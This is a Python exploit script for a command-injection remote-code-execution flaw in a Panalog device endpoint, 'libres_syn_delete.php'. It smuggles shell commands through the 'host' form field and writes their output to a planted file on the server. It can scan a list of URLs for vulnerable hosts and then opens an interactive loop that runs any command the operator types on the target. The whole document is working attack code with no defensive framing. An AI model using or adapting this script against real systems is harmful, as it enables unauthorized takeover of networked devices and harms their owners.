import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target_url = urljoin(url, "/content-apply/libres_syn_delete.php")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    random_str = generate_random_string(10)
    data = "token=1&id=2&host=|echo%20{} >madwd1o190kdj".format(random_str)
    try:
        response = requests.post(target_url, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and 'OK' in response.text:
            result_url = urljoin(url,'/content-apply/madwd1o190kdj')
            result_response = requests.get(result_url,headers=headers, verify=False, timeout=15)
            if result_response.status_code == 200 and random_str in result_response.text:
                print(f"\033[31mDiscovered:{url}: Panalog_libres_syn_delete_RCE\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/content-apply/libres_syn_delete.php")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                data = "token=1&id=2&host=|{} >madwd1o190kdj".format(command)
                try:
                    response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
                    if response.status_code == 200 and 'OK' in response.text:
                        result_url = urljoin(url, '/content-apply/madwd1o190kdj')
                        result_response = requests.get(result_url, headers=headers, verify=False, timeout=15)
                        if result_response.status_code == 200:
                            print(result_response.text)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")